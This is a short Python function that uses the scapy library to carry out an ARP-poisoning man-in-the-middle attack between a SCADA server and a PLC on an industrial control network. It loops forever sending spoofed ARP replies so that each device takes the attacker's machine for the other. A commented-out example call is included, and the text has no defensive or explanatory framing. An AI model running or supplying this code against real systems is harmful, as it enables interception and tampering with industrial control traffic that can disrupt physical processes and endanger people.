def ot_mitm_positioning(scada_ip, plc_ip):
    """
    Position between SCADA server and PLC
    """
    from scapy.all import ARP, send, getmacbyip
    import time

    scada_mac = getmacbyip(scada_ip)
    plc_mac = getmacbyip(plc_ip)

    print(f"[*] Poisoning ARP: SCADA {scada_ip} ←→ PLC {plc_ip}")

    while True:
        # Tell SCADA we are the PLC
        send(ARP(op=2, pdst=scada_ip, hwdst=scada_mac, psrc=plc_ip), verbose=False)

        # Tell PLC we are SCADA
        send(ARP(op=2, pdst=plc_ip, hwdst=plc_mac, psrc=scada_ip), verbose=False)

        time.sleep(2)

# ot_mitm_positioning('192.168.1.50', '192.168.1.100')
